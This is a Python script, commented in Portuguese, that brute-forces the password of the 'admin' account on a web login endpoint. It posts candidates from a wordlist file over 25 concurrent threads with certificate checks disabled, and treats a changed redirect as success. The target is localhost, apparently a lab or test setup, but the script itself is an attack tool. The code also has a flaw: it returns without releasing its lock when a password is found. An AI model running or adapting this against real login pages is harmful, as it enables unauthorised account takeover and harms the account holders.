import requests
import concurrent.futures
import threading

requests.packages.urllib3.disable_warnings()

# URL da API
url = "https://localhost:7078/Users/Login"

# Cabeçalhos da solicitação
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
lock = threading.Lock()
request_count = 0

def test_password(password):
    data = {
        "username": "admin",
        "password": password       
    }


    response = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=False)

    global request_count
    lock.acquire()
    request_count += 1
    if request_count % 50 == 0:
        print(f"Solicitação {request_count} para senha: {password}, Status: {response.status_code}")
    # Verifique a resposta
    if "/Users/Login" not in response.headers['Location']:
        print(f"Senha encontrada: {password}")
        return password
    lock.release()

# Abra o arquivo de texto com as palavras

with open('wordlist.txt', 'r') as file:
    passwords = [line.strip() for line in file]



with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:  # Defina o número máximo de threads desejado
    future_to_password = {executor.submit(test_password, password): password for password in passwords}
    for future in concurrent.futures.as_completed(future_to_password):
        if future.result():
            # Se uma senha válida for encontrada, pare o processamento
            executor.shutdown(wait=False)
            break